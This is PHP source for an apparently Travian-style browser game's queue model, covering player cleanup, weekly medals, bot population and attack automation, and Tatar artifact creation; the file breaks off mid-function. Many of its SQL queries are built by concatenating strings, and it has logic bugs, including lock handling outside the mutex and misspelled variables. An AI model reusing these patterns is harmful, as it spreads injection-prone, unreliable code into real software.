<?php

require_once(MODEL_PATH . "report.php");
require_once(MODEL_PATH . "mutex.php");
class QueueJobModel extends ModelBase
    {
        function deleteInactivePlayers ()
        {
                $result = $this->provider->fetchResultSet ("SELECT id, name FROM p_players WHERE UNIX_TIMESTAMP(NOW())-UNIX_TIMESTAMP(registration_date)>432000 AND is_active = 0");
                while ($result->next())
                        $this->deletePlayer ($result->row["id"]);
                $this->provider->executeQuery ("UPDATE g_summary SET active_players_count = (SELECT COUNT(*) FROM p_players WHERE is_active = 1)");
                        // This crap will delete every unactivated player registered more than 3 days ago.
        }

    public function processQueue()
        {
        $mutex = new MutexModel();
        $mutex->releaseOnTimeout();
        if ($mutex->lock())
            {
            $this->processTaskQueue();

                $row = $this->provider->fetchRow("SELECT gs.cur_week w1, last_madel, CEIL((TO_DAYS(NOW())-TO_DAYS(gs.start_date))/7) w2 FROM g_settings gs");
$lt = $row['last_madel'];
$tn = time();
$yn = ($tn-$lt);
$awsmh = $GLOBALS['AppConfig']['Game']['awsmh'];
if ($yn >= $awsmh) {
                    $this->setWeeklyMedals(intval($row['w1']+1));
                $this->provider->executeQuery("UPDATE g_settings SET last_madel=%s", array(  $tn ));


                    $this->provider->executeQuery("UPDATE g_settings gs SET gs.cur_week=%s", array(
                        intval($row['w1']+1)
                    ));
         $this->provider->executeQuery( "UPDATE p_players SET gold_num = gold_num + ".$GLOBALS['AppConfig']['Game']['freegoldweek']."");
                    }
            $mutex->release();
            }
			{
			
		 $this->processTaskQueue();
          #$row = $this->provider->fetchRow("SELECT gs.cur_berq w1, last_berq_time, CEIL((TO_DAYS(NOW())-TO_DAYS(gs.start_date))/7) w2 FROM g_settings gs");
          $row = $this->provider->fetchRow("SELECT last_berq_time FROM g_settings");
          $lt = $row['last_berq_time'];
          $tn = time();
          $yn = ($tn-$lt);
          $berq_time = $GLOBALS['AppConfig']['Game']['berq_time'];

          if ($yn >= $berq_time)
          {
              #$this->setWeeklyMedals(addslashes($row['w1']+1));
              $this->provider->executeQuery("UPDATE g_settings SET last_berq_time=%s", array( $tn ));


              $berq_player = $this->provider->fetchRow("SELECT player_id FROM p_villages WHERE id='100'");
              #$this->provider->executeQuery("UPDATE g_settings gs SET gs.cur_berq=%s", array( addslashes($row['w1']+1) ));
              $this->provider->executeQuery("UPDATE p_players SET gold_num = gold_num + '".$GLOBALS['AppConfig']['Game']['berq_gold']."' WHERE id='".$berq_player['player_id']."'");
//     bots  people       
 
	            $bot_player = $this->provider->fetchRow("SELECT total_people_count FROM p_players WHERE is_bot='1'");
				$bot_player_tribe = $this->provider->fetchRow("SELECT total_people_count FROM p_players WHERE tribe_id='2'");
				$bot_playerv = $this->provider->fetchRow("SELECT id FROM p_villages WHERE id='".$bot_player['id']."'");
				$server_start = $this->provider->fetchScalar("SELECT COUNT(*) FROM p_queue WHERE proc_type='57'");
				$server_ends = $this->provider->fetchScalar("SELECT COUNT(*) FROM p_queue WHERE proc_type='24'");
			if (!$server_start AND $server_ends){
				$pgmp = $this->provider->fetchResultSet( "SELECT * FROM p_players WHERE is_bot = '1' ORDER BY RAND() LIMIT 20");
				$i = 1;
        while ( $pgmp->next( ) )
        {
			// منع رفع السكان عند التدمير
						$counts_v2 = mt_rand(1700,1800); // لازم تعدل الحد الاقصى لسكان القرية 

			if($pgmp->row['total_people_count'] >= $counts_v2 ) {
			$this->provider->executeQuery("UPDATE p_players SET over_pop='1' WHERE id='".$pgmp->row['id']."'");
			// نسخ القرى 
						$counts_v = mt_rand(1,2);

			if($pgmp->row['villages_count'] >= $counts_v  ) {
			$this->provider->executeQuery("UPDATE p_players SET over_pop='2' WHERE id='".$pgmp->row['id']."'");
			}
			if($pgmp->row['villages_count'] <= $counts_v AND $pgmp->row['over_pop'] == 1 ) {
			$tovlg =  $this->provider->fetchRow("SELECT id FROM p_villages WHERE tribe_id= '0' AND is_oasis = '0' AND field_maps_id='3' ORDER BY RAND() LIMIT 1 ");
		    $botvlg =  $this->provider->fetchRow("SELECT id,player_id,tribe_id,people_count,player_name,buildings,resources,troops_training,troops_num FROM p_villages WHERE is_capital= '1' AND player_id='".$pgmp->row['id']."' ");
            $villageNames = "قريه منسوخه ".($pgmp->row['villages_count']);
            $update_key = substr( md5( $botvlg['player_id'].$botvlg['tribe_id'].$tovlg['id'].$botvlg['player_name'].$villageName ), 2, 5 );
			$bp_id = $pgmp->row['id'];
			$btribe_id = $pgmp->row['tribe_id'];
    		$balliance_id = $pgmp->row['alliance_id'];
			$b_name = $pgmp->row['name'];
    		$balliance_id = $pgmp->row['alliance_name'];

		    $this->provider->executeQuery( "UPDATE p_villages SET parent_id=%s,people_count=%s,tribe_id=%s,player_id=%s,alliance_id=%s,player_name='%s',village_name='%s',alliance_name='%s',is_capital=0,buildings='%s',resources='%s',cp='0 2',troops_training='%s',troops_num='%s',update_key='%s',troops_training='%s',creation_date=NOW(),last_update_date=NOW() WHERE id=%s", array(
            floatval( $pgmp->row['selected_village_id'] ),
		    floatval( $botvlg['people_count'] ),
            floatval( $pgmp->row['tribe_id'] ),
            floatval( $pgmp->row['id'] ),
            0 < floatval( $pgmp->row['alliance_id'] ) ? floatval( $pgmp->row['alliance_id'] ) : "NULL",
            $pgmp->row['name'],
            $villageNames,
            $pgmp->row['alliance_name'],
            $botvlg['buildings'],
            $botvlg['resources'],
            $botvlg['troops_training'],
            $botvlg['troops_num'],
            $update_key,
            $botvlg['troops_training'],
             $tovlg['id'] 
        ) );

		    $b1ss = $this->provider->fetchRow("SELECT villages_id FROM p_players WHERE id='".$pgmp->row['id']."'");
$botpss = $b1ss['villages_id'];
$villages_id = $botpss;
        if ( $villages_id != "" )
        {
            $villages_id .= ",";
        }
        $villages_id .= $tovlg['id'];
		$this->provider->executeQuery("UPDATE p_players SET total_people_count=total_people_count+'".$botvlg['people_count']."',villages_count=villages_count+1,villages_id='".$villages_id."',dev_points=dev_points+'".$botvlg['people_count']."' ,week_dev_points=week_dev_points+'".$botvlg['people_count']."' WHERE id='".$pgmp->row['id']."'");
			}
			//
			}
			//
			if($pgmp->row['total_people_count'] >= 2 AND $pgmp->row['total_people_count'] < 3400 AND $pgmp->row['over_pop'] == 0) {
		    $sokan = mt_rand(50,100);	
			$now=date('Y-m-d H:i:s');			
		    $this->provider->executeQuery("UPDATE p_players SET total_people_count=total_people_count+'".$sokan."' WHERE id='".$pgmp->row['id']."'");
			$this->provider->executeQuery("UPDATE p_players SET week_dev_points=week_dev_points+'".$sokan." 'WHERE id='".$pgmp->row['id']."'");	
            $this->provider->executeQuery("UPDATE p_villages SET people_count=people_count+'".$sokan." 'WHERE player_id='".$pgmp->row['id']."'");
			$this->provider->executeQuery("UPDATE p_players SET last_login_date='".$now."' WHERE id='".$pgmp->row['id']."'");	

			
			
		
			 
			}
			//
			if($pgmp->row['total_people_count'] > 1200){

				$botatt = $this->provider->fetchRow("SELECT botatt FROM g_settings ");
				if($botatt['botatt'] == 1){
				// attack oasis
				#$oasisid = $this->provider->fetchRow("SELECT id FROM p_villages WHERE is_oasis='1' AND tribe_id='4' ORDER BY RAND() LIMIT 10");
				$botvid = $this->provider->fetchRow("SELECT id,selected_village_id FROM p_players WHERE is_bot='1' ORDER BY RAND() LIMIT 20");
							$execution_timet = strip_tags(mt_rand(30,60));
							if($pgmp->row['tribe_id'] == 1) {
							$attack1 =  mt_rand(0,548234567845);
                            $t1 =       mt_rand(100,943154785698);
                            $t2 =       mt_rand(0,978642468547);
							$proc_params =  '1 '.floatval($t1).',2 '.floatval($t1).',3 '.floatval($t2).',4 0,5 0,6 0,7 0,8 0,9 0,5 0|0|0|||||0';
                            $this->provider->executeQuery('INSERT INTO p_queue SET player_id="'.$pgmp->row['id'].'", village_id="'.$pgmp->row['selected_village_id'].'", to_player_id="'.$botvid['id'].'", to_village_id="'.$botvid['selected_village_id'].'", proc_type="14", building_id="NULL", proc_params="'.$proc_params.'", threads="1", end_date=(NOW() + INTERVAL '.$execution_timet.' SECOND), execution_time="'.$execution_timet.'"');
							}
							if($pgmp->row['tribe_id'] == 2) {
							$attack1 =  mt_rand(0,123457452156);
                            $t1 =       mt_rand(2000,345135458955);
                            $t2 =       mt_rand(0,478851244956);
							$proc_params =  '11 '.floatval($t1).',12 '.floatval($t2).',13 '.floatval($t1).',14 0,15 0,16 0,17 0,18 0,19 0,15 0|0|0|||||0';
                            $this->provider->executeQuery('INSERT INTO p_queue SET player_id="'.$pgmp->row['id'].'", village_id="'.$pgmp->row['selected_village_id'].'", to_player_id="'.$botvid['id'].'", to_village_id="'.$botvid['selected_village_id'].'", proc_type="14", building_id="NULL", proc_params="'.$proc_params.'", threads="1", end_date=(NOW() + INTERVAL '.$execution_timet.' SECOND), execution_time="'.$execution_timet.'"');
							}
							if($pgmp->row['tribe_id'] == 3) {
							$attack1 =  mt_rand(0,897753465124);
                            $t1 =       mt_rand(2000,345789542154);
                            $t2 =       mt_rand(0,954866421563);
							$proc_params =  '21 '.floatval($t1).',22 '.floatval($t2).',23 0,24 0,25 0,26 0,27 0,28 0,29 0,25 0|0|0|||||0';
                            $this->provider->executeQuery('INSERT INTO p_queue SET player_id="'.$pgmp->row['id'].'", village_id="'.$pgmp->row['selected_village_id'].'", to_player_id="'.$botvid['id'].'", to_village_id="'.$botvid['selected_village_id'].'", proc_type="14", building_id="NULL", proc_params="'.$proc_params.'", threads="1", end_date=(NOW() + INTERVAL '.$execution_timet.' SECOND), execution_time="'.$execution_timet.'"');
							}
		
				}
			// start roman
			
			if($pgmp->row['tribe_id'] == 1 AND $pgmp->row['hero_troop_id'] == NULL) {
	
			$tjnod = mt_rand (1,3);
	switch($tjnod)
            {
case 1:
                 $tjnod = '1';
                break;
case 2:
                 $tjnod = '2';
                break;	
case 3:
                 $tjnod = '3';
                break;	
				
			}
									$tjnodh = mt_rand (1,6);

			  $this->provider->executeQuery("UPDATE p_players SET hero_troop_id='".$tjnodh."',hero_name='".$pgmp->row['name']."',hero_in_village_id='".$pgmp->row['selected_village_id']."' WHERE id='".$pgmp->row['id']."'");
			}// end roman
			
			// start German
			if($pgmp->row['tribe_id'] == 2 AND $pgmp->row['hero_troop_id'] == NULL) {
			$tjnod = mt_rand (1,4);
	switch($tjnod)
            {
case 1:
                 $tjnod = '11';
                break;
case 2:
                 $tjnod = '12';
                break;	
case 3:
                 $tjnod = '13';
                break;	
case 4:
                 $tjnod = '14';
                break;				
			}
						$tjnodh = mt_rand (11,16);

			 $this->provider->executeQuery("UPDATE p_players SET hero_troop_id='".$tjnodh."',hero_name='".$pgmp->row['name']."',hero_in_village_id='".$pgmp->row['selected_village_id']."' WHERE id='".$pgmp->row['id']."'");
			}// end German
			
			
			
			// start greeq
			if($pgmp->row['tribe_id'] == 3 AND $pgmp->row['hero_troop_id'] == NULL) {
	
			$tjnod = mt_rand (1,2);
	switch($tjnod)
            {
case 1:
                 $tjnod = '21';
                break;
case 2:
                 $tjnod = '22';
                break;	
				
			}
			$tjnodh = mt_rand (21,26);
	
			 $this->provider->executeQuery("UPDATE p_players SET hero_troop_id='".$tjnodh."',hero_name='".$pgmp->row['name']."',hero_in_village_id='".$pgmp->row['selected_village_id']."' WHERE id='".$pgmp->row['id']."'");
			}// end greeq
			
			}
			
			$i++;
		}
			}
//	end bots people	

		   }
                
            $mutex->release();
        }
		
		{
           $this->processTaskQueue(); 
		{
               $berq_player_id = $this->provider->fetchRow("SELECT player_id FROM p_villages WHERE land_num='34'");   
               $this->provider->executeQuery("UPDATE p_players SET registration_date = '0000-00-00 00:00:00' WHERE id='".$berq_player_id['player_id']."'");
            }                
            $mutex->release();
        }
        }
		
  public function processTaskQueue()
        {
        $result = $this->provider->fetchResultSet("SELECT \r\n\t\t\t\tq.id, q.player_id, q.village_id, q.to_player_id, q.to_village_id, q.proc_type, q.building_id, q.proc_params, q.threads, q.execution_time,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(q.end_date, NOW())) remainingTimeInSeconds\r\n\t\t\tFROM p_queue q\r\n\t\t\tWHERE\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF((q.end_date - INTERVAL (q.execution_time*(q.threads-1)) SECOND), NOW())) <= 0\r\n\t\t\tORDER BY\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF((q.end_date - INTERVAL (q.execution_time*(q.threads-1)) SECOND), NOW())) ASC");
        while ($result->next())
            {
            $remain = $result->row['remainingTimeInSeconds'];
            if ($remain < 0)
                {
                $remain = 0;
                }
            $result->row['threads_completed_num'] = $result->row['execution_time'] <= 0 ? $result->row['threads'] : floor(($result->row['threads'] * $result->row['execution_time'] - $remain) / $result->row['execution_time']);
            if ($this->processTask($result->row))
                {
                $result->free();
                $this->processTaskQueue();
                break;
                }
            }
        }    public function setWeeklyMedals( $week )
    {
        require_once( MODEL_PATH."statistics.php" );
        $keyArray = array( "week_dev_points" => 1, "week_attack_points" => 2, "week_defense_points" => 3, "week_thief_points" => 4 );
        $sm = new StatisticsModel( );
        foreach ( $keyArray as $columnName => $index )
        {
            $result = $sm->getTop10( TRUE, $columnName );
            if ( $result != NULL )
            {
                $i = 0;
                while ( $result->next( ) )
                {
$num = $this->provider->fetchRow( "SELECT * FROM p_players  WHERE id='%s'", array(
            $result->row['id']
                ) );

                $a = $num[''.$columnName.''];
                    $medal = $index.":".++$i.":".$week.":".$a;
$givegold = array("1" => 20000, "2" => 10000, "3" => 8000, "4" => 7000, "5" => 6000, "6" => 5000, "7" => 4000, "8" => 3000, "9" => 2000, "10" => 1000);
                    $this->provider->executeQuery( "UPDATE p_players SET gold_num=gold_num+%s, medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array(
                        $givegold[$i],
                        $medal,
                        $result->row['id']
                    ) );
                }
            }
            $result = $sm->getTop10( FALSE, $columnName );
            if ( !( $result != NULL ) )
            {
                continue;
            }
            $i = 0;
            while ( $result->next( ) )
            {
$num = $this->provider->fetchRow( "SELECT * FROM p_alliances WHERE id='%s'", array(
            $result->row['id']
                ) );
                $a = $num[''.$columnName.''];
                $medal = ( $index + 4 ).":".++$i.":".$week.":".$a;
                $this->provider->executeQuery( "UPDATE p_alliances SET medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array(
                    $medal,
                    $result->row['id']
                ) );
            }
        }
		$keyArraynew = array( "week_dev_points" => 1, "week_attack_points" => 2, "week_defense_points" => 3, "week_thief_points" => 4 );
		foreach ($keyArraynew as $columnNamenew => $indexnew)
            {
           $resultnew = $sm->getTop3($columnNamenew);
            if ($resultnew != NULL)
                {
                while ($resultnew->next())
                    {
					$medals = $resultnew->row['medals'];
					for($i = 1; $i <= 3; $i++){
					$medals_week_1 += count(split($indexnew.":".$i.":".($week), $medals))-1;
					$medals_week_2 += count(split($indexnew.":".$i.":".($week-1), $medals))-1;
					$medals_week_3 += count(split($indexnew.":".$i.":".($week-2), $medals))-1;
					}
                    $medals_new = count(split(($indexnew+11).":1", $medals))-1;
					if($medals_new == 0 AND $medals_week_1 > 0 AND $medals_week_2 > 0 AND $medals_week_3 > 0 ){
                    $medal = ($indexnew+11). ":1:" . $week . ":0";
                    $this->provider->executeQuery("UPDATE p_players SET medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array( $medal, $resultnew->row['id']));
                    }
					$medals_week_1 = 0;
					$medals_week_2 = 0;
					$medals_week_3 = 0;
					}
                }
            }
		## Here Code
		$result_attack_defense = $sm->getTop10_attack_defense();
		if($result_attack_defense != NULL){
		while ($result_attack_defense->next())
        {
		$medals = $result_attack_defense->row['medals'];
        $Abu_star_count_1 = count(split("9:1", $medals))-1;
        $Abu_star_count_2 = count(split("10:1", $medals))-1;
        $Abu_star_count_3 = count(split("11:1", $medals))-1;
		if($Abu_star_count_1 == 0 ){
		$medal = "9:1:" . $week . ":0";
		$this->provider->executeQuery("UPDATE p_players SET medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array( $medal, $result_attack_defense->row['id']));
		}elseif($Abu_star_count_1 == 1 AND $Abu_star_count_2 == 0){
		$medal = "10:1:" . $week . ":0";
		$this->provider->executeQuery("UPDATE p_players SET medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array( $medal, $result_attack_defense->row['id']));
		}elseif($Abu_star_count_1 == 1 AND $Abu_star_count_2 == 1 AND $Abu_star_count_3 == 0){
		$medal = "11:1:" . $week . ":0";
		$this->provider->executeQuery("UPDATE p_players SET medals=CONCAT_WS(',', medals, '%s') WHERE id=%s", array( $medal, $result_attack_defense->row['id']));
		}
		}
		}
		
		## End Here Code

        $this->provider->executeQuery( "UPDATE p_players   SET week_dev_points=0, week_attack_points=0, week_defense_points=0, week_thief_points=0" );
        $this->provider->executeQuery( "UPDATE p_alliances SET week_dev_points=0, week_attack_points=0, week_defense_points=0, week_thief_points=0" );
        $sm->dispose( );
    }    function processTask($taskRow)
        {
        $customAction = FALSE;
        switch ($taskRow['proc_type'])
        {
            case QS_ACCOUNT_DELETE:
                {
                $this->deletePlayer($taskRow['player_id']);
                break;
                }
            case QS_BUILD_CREATEUPGRADE:
                {
                $customAction = $this->executeBuildingTask($taskRow);
                break;
                }
            case QS_BUILD_DROP:
                {
                $customAction = $this->executeBuildingDropTask($taskRow);
                break;
                }
            case QS_TROOP_RESEARCH:
                {
                }
            case QS_TROOP_UPGRADE_ATTACK:
                {
                }
            case QS_TROOP_UPGRADE_DEFENSE:
                {
                $this->executeTroopUpgradeTask($taskRow);
                break;
                }
            case QS_TROOP_TRAINING:
                {
                $this->executeTroopTrainingTask($taskRow);
                break;
                }
            case QS_TROOP_TRAINING_HERO:
                {
                $this->executeHeroTask($taskRow);
                break;
                }
            case QS_TOWNHALL_CELEBRATION:
                {
                $this->executeCelebrationTask($taskRow);
                break;
                }
            case QS_MERCHANT_GO:
                {
                $customAction = $this->executeMerchantTask($taskRow);
                break;
                }
            case QS_MERCHANT_BACK:
                {
				$this->rebroadcastMerchant($taskRow);
                break;
                }
            case QS_WAR_REINFORCE:
                {
                }
            case QS_WAR_ATTACK:
                {
                }
            case QS_WAR_ATTACK_PLUNDER:
                {
                }
            case QS_WAR_ATTACK_SPY:
                {
                }
            case QS_CREATEVILLAGE:
                {
                $customAction = $this->executeWarTask($taskRow);
                break;
                }
            case QS_LEAVEOASIS:
                {
                $this->executeLeaveOasisTask($taskRow);
                break;
                }
            case QS_PLUS1:
                {
                $this->provider->executeQuery('UPDATE p_players p SET p.active_plus_account=0 WHERE p.id=%s', array(
                    intval($taskRow['player_id'])
                ));
       
         break;
                }
            case QS_PLUS2:
                {
                $this->executePlusTask($taskRow, 1);
                break;
                }
            case QS_PLUS3:
                {
                $this->executePlusTask($taskRow, 2);
                break;
                }
            case QS_PLUS4:
                {
                $this->executePlusTask($taskRow, 3);
                break;
                }
            case QS_PLUS5:
                {
                $this->executePlusTask($taskRow, 4);
                break;
                }
           case QS_TATAR_RAISE:
                {
               break;
                }
            case QS_SITE_RESET:
                {
                $this->dispose( );
                header( "location: login?myinstall=install" );
                exit( 0 );
                return;
               break;
                }
           case QS_TATAR_ART:
                {
               break;
                }
            case QS_A_P:
                {

                }
            case QS_D_P:
                {

                }
            case QS_S_P:
                {

                }

        }
        if (!$customAction)
            {
            $remaining_thread = $taskRow['threads'] - $taskRow['threads_completed_num'];
            if ($remaining_thread <= 0)
                {
                $this->provider->executeQuery("DELETE FROM p_queue WHERE id=%s", array(
                    intval($taskRow['id'])
                ));
                }
            else
                {
                $this->provider->executeQuery("UPDATE p_queue q SET q.threads=%s WHERE q.id=%s", array(
                    intval($remaining_thread),
                    intval($taskRow['id'])
                ));
                }
            }
        return $customAction;
        }
	function cropBalance($playerId, $villageId , $iso , $vis)
	{
		$playerId = intval($playerId);
		$villageId = intval($villageId);
		$row = $this->provider->fetchRow('SELECT
				v.crop_consumption,
				v.people_count,
                is_oasis,
				v.resources, v.cp,
				v.troops_num, v.troops_out_num, v.troops_intrap_num,
				TIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds,
				TIME_TO_SEC(TIMEDIFF(NOW(), v.creation_date)) oasisElapsedTimeInSeconds
			FROM p_villages v
			WHERE v.id=%s AND v.player_id=%s', array(
			intval($villageId),
			intval($playerId)
		));
		if ($row == NULL)
			return null;
		$playerRow = $this->provider->fetchRow ("SELECT p.villages_data FROM p_players p WHERE p.id=%s", Array ($playerId));
		$pvill = explode ("\n", $playerRow['villages_data']);
		$villArr = Array ();
		$vilArr[] = -1;
		foreach ($pvill as $v)
		{
			$tmp = explode (" ", $v);
			$villArr[] = $tmp[0];
		}
		$resArr = Array ();
		$uArr = Array ();
if ($iso) {
		$row2 = $this->provider->fetchRow('SELECT
				v.crop_consumption,
				v.people_count,
				v.resources, v.cp,
				v.troops_num, v.troops_out_num, v.troops_intrap_num,
				TIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds,
				TIME_TO_SEC(TIMEDIFF(NOW(), v.creation_date)) oasisElapsedTimeInSeconds
			FROM p_villages v
			WHERE v.id=%s AND v.player_id=%s', array(
			intval($vis),
			intval($playerId)
		));
		$resArr  = $this->g_getResourcesArrayy($row2['resources'], $row2['elapsedTimeInSeconds'], $row2['crop_consumption'], $row2['cp']);
}else {
		$resArr  = $this->g_getResourcesArrayy($row['resources'], $row['elapsedTimeInSeconds'], $row['crop_consumption'], $row['cp']);
}
		$crop = $resArr['resources'][4]['current_value'];

		if ($crop < 0)
{
			$tArr = $this->g_getTroopsArrayy($row['troops_num']);
			arsort ($tArr);
			foreach ($tArr as $k => $v)
				arsort ($tArr[$k], ksort($tArr[$k]));
			$killCrop = 0 - $crop;


			if ($killCrop < 0)
				return 0;
            if ($iso) {

			$cropCons = $row2["crop_consumption"];
} else {
    $cropCons = $row["crop_consumption"];
    }
			for ($pass = 0; $pass < 2; ++$pass)
				foreach ($tArr as $k => $v)
				{
					$myVil = in_array ($k, $vilArr);
					if ($pass == 0 && $myVil || $pass == 1 && !$myVil)
						continue;
					foreach ($v as $tid => $tnum)
					{
						$troopCrop = $GLOBALS["GameMetadata"]["troops"][$tid]["training_resources"][4];
						$troopCons = $GLOBALS["GameMetadata"]["troops"][$tid]["crop_consumption"];
						$reqKill = ceil ($killCrop / $troopCrop);
						if ($reqKill < $tnum)
						{
							$cropCons -= $reqKill * $troopCons;
                                  $cropConss -= $reqKill * $troopCons;
							$getCrop = $reqKill * $troopCrop;
							$crop += $getCrop;
							$killCrop -= $getCrop;
							$tArr[$k][$tid] -= $reqKill;
							break 3;
						}
						else
						{
							$cropCons -= $tnum * $troopCons;
                           $cropConss -= $tnum * $troopCons;
							$getCrop = $tnum * $troopCrop;
							$crop += $getCrop;
							$killCrop -= $getCrop;
							$tArr[$k][$tid] = 0;
						}
					}
				}
			ksort ($tArr);
			foreach ($tArr as $k => $v)
				ksort ($tArr[$k]);
			$troops = $this->g_getTroopsStringg ($tArr);
			$cp = $resArr['cp']['cpValue'] . " " . $resArr['cp']['cpRate'];
			$resArr['resources'][4]['current_value'] = $crop;
			$resources = $this->g_getResourcesStringg($resArr['resources']);
            if ($iso) {
$this->provider->executeQuery ("UPDATE p_villages SET troops_num = '$troops', last_update_date = NOW() WHERE id = $villageId");
$this->provider->executeQuery ("UPDATE p_villages SET resources = '$resources', crop_consumption = $cropCons, cp = '$cp', last_update_date = NOW() WHERE id = $vis");
} else {
   $this->provider->executeQuery ("UPDATE p_villages SET troops_num = '$troops', resources = '$resources', crop_consumption = $cropCons, cp = '$cp', last_update_date = NOW() WHERE id = $villageId");
    }			$troops = explode ("|", $troops);
			$j = sizeof ($troops);
			for ($i = 0; $i < $j; ++$i)
			{
				$vil = explode (":", $troops[$i]);
				if ($vil[0] != "-1")
				{
					$e = $this->provider->fetchScalar ("SELECT troops_out_num FROM p_villages WHERE id = " . $vil[0]);
					$ee = explode ("|", $e);
					$l = sizeof ($ee);
					for ($k = 0; $k < $l; ++$k)
					{
						$eee = explode (":", $ee[$k]);
						if ($eee[0] == $villageId)
						{
							$eee[1] = $vil[1];
							$ee[$k] = implode (":", $eee);
							break;
						}
					}
					$e = implode ("|", $ee);                             //crop_consumption = crop_consumption-".$cropConss.",
					$this->provider->executeQuery ("UPDATE p_villages SET troops_out_num = '$e' WHERE id = " . $vil[0]);
				}
			}
		}
		else
			return 0;
	}

	function g_getTroopsStringg($troopsArray)
	{
		$result = '';
		foreach ($troopsArray as $vid => $troopsNumArray)
		{
			if ($result != '')
			{
				$result .= '|';
			}
			$innerResult = '';
			foreach ($troopsNumArray as $tid => $num)
			{
				if ($innerResult != '')
				{
					$innerResult .= ',';
				}
				if ($tid == -1)
				{
					$innerResult .= $num . ' ' . $tid;
				}
				else
				{
					$innerResult .= $tid . ' ' . $num;
				}
			}
			$result .= $vid . ':' . $innerResult;
		}
		return $result;
	}


	function g_getTroopsArrayy($troops_num)
	{
		$troopsArray = array();
		$t_arr	   = explode('|', $troops_num);
		foreach ($t_arr as $t_str)
		{
			$t2_arr			= explode(':', $t_str);
			$vid			   = $t2_arr[0];
			$troopsArray[$vid] = array();
			$t2_arr			= explode(',', $t2_arr[1]);
			foreach ($t2_arr as $t2_str)
			{
				$t = explode(' ', $t2_str);
				if ($t[1] == -1)
				{
					$troopsArray[$vid][intval($t[1])] = intval($t[0]);
				}
				else
				{
					$troopsArray[$vid][intval($t[0])] = intval($t[1]);
				}
			}
		}
		return $troopsArray;
	}

	function g_getResourcesArrayy($resourceString, $elapsedTimeInSeconds, $crop_consumption, $cp)
	{
		$resources = array();
		$r_arr	 = explode(',', $resourceString);
		foreach ($r_arr as $r_str)
		{
			$r2			= explode(' ', $r_str);
			$prate		 = floor($r2[4] * (1 + $r2[5] / 100)) - ($r2[0] == 4 ? $crop_consumption : 0);
			$current_value = floor($r2[1] + $elapsedTimeInSeconds * ($prate / 3600));
			if ($r2[2] < $current_value)
			{
				$current_value = $r2[2];
			}
			$resources[$r2[0]] = array(
				'current_value' => $current_value,
				'store_max_limit' => $r2[2],
				'store_init_limit' => $r2[3],
				'prod_rate' => $r2[4],
				'prod_rate_percentage' => $r2[5]
			);
		}
		list($cpValue, $cpRate) = explode(' ', $cp);
		$cpValue += $elapsedTimeInSeconds * ($cpRate / 86400);
		return array(
			'resources' => $resources,
			'cp' => array(
				'cpValue' => round($cpValue, 4),
				'cpRate' => $cpRate
			)
		);
	}
	function g_getResourcesStringg($resources)
	{
		$result = '';
		foreach ($resources as $k => $v)
		{
			if ($result != '')
			{
				$result .= ',';
			}
			$result .= $k . ' ' . $v['current_value'] . ' ' . $v['store_max_limit'] . ' ' . $v['store_init_limit'] . ' ' . $v['prod_rate'] . ' ' . $v['prod_rate_percentage'];
		}
		return $result;
	}

/////////////////////////////////////////////////////////////



    public function createTatarArt()
        {  // crete artef
        require_once(MODEL_PATH . "register.php");
        $map_siz = $GLOBALS['SetupMetadata']['map_size'];
        $mama        = new RegisterModel();//tatar_tribe_player
        $result   = $mama->createNewPlayer(tatar_tribe_player, "", "", 5, 0, tatar_tribe_villages, $map_siz, PLAYERTYPE_TATAR, 12);
        //pop
        $this->provider->executeQuery ("UPDATE p_players SET registration_date = 0 WHERE id=%s", array(
            intval($result['playerId'])
        ));

        $this->provider->executeQuery("UPDATE p_players p SET p.total_people_count=1440, p.description1='%s', p.guide_quiz='-1' WHERE id=%s", array(
            tatar_tribe_desc2,
            intval($result['playerId'])
        ));
$this->provider->executeQuery( "UPDATE p_players SET new_gnews=1");
$n = 'هذا لسان حال أهل هذا العالم في حرب التتار.

انتشر خبر ظهور التحف كالنار في الهشيم، إذ لطالما تناقل أهل هذا العالم، ممن عايشوا عوالم أخرى، تناقلوا الأخبار عن تحف تهب من يمتلكها إمكانيات هائلة وقوى عظيمة ترفعه لأعلى المستويات وتجعله في مصافّ الأبطال!

كتب، مخطوطات، آثار واشياء أخرى أسطورية من أيام خلت، كانت فيها امبراطورية التتار هي الوحيدة التي تحكم هذا العالم، وعنها ينقل العارفون الإمكانيات الهائلة التي يمتلكها من يستطيع الحصول على هذه التحف.

غابت أخبار هذه التحف منذ زمن طويل، لتعود وتنتشر أخبارها من جديد هنا وهناك، ويستطيع أهل الخبرة معرفة وجودها من التتار أنفسهم، بكثرة وقوة الجنود التي رصدوها لحراسة ما ورثوه عن أجدادهم.
تحف منتصف اللعبة

الحكماء فقط، يرسلون جيوشهم مع أبطالهم في الوقت المناسب ليجلبوا لهم التحف، قبل أن تقع هذه التحف في أيدٍ ستعمل ضدهم وضد تحالفاتهم.

أرسلوا جيوشكم مع الأبطال، وعيشوا لذة التحدي،
نسأل الله أن يكون التوفيق في صفكم.';
 $this->provider->executeQuery( "UPDATE g_summary SET gnews_text='".$n."'");

        $troop_ids = array();
        foreach ($GLOBALS['GameMetadata']['troops'] as $k => $v)
            {
            if ($v['for_tribe_id'] == 5)
                {
                $troop_ids[] = $k;
                }
            }
        $firstFla = TRUE;
        $s = 0;
        foreach ($result['villages'] as $createdVillage => $v)
            {
        $s++;
if ($s <= 8 && $s > 4) {
$type = 2;
}else if ($s <= 4 && $s > 0) {
$type = 4;
}else if ($s <= 12 && $s > 8) {
$type = 3;
}
$l = 50*$type;
            $troops_num = "";
            foreach ($troop_ids as $tid)
                {
                if ($troops_num != "")
                    {
                    $troops_num .= ",";
                    }
if ($tid == 49 || $tid == 50) {
$num = 0;
}else if ($tid == 44 || $tid == 47 || $tid == 48) {
$num = mt_rand(255, 300)*$GLOBALS['GameMetadata']['game_speed'];
}else if ($tid == 45 || $tid == 46) {
$num = mt_rand(200, 300)+$l*$GLOBALS['GameMetadata']['game_speed'];
}else {
$num = mt_rand(200, 300)+$l*$GLOBALS['GameMetadata']['game_speed'];
}
$troops_num .= sprintf("%s %s", $tid, $num);
}
if  ($s == 1 || $s == 5 || $s == 9) {
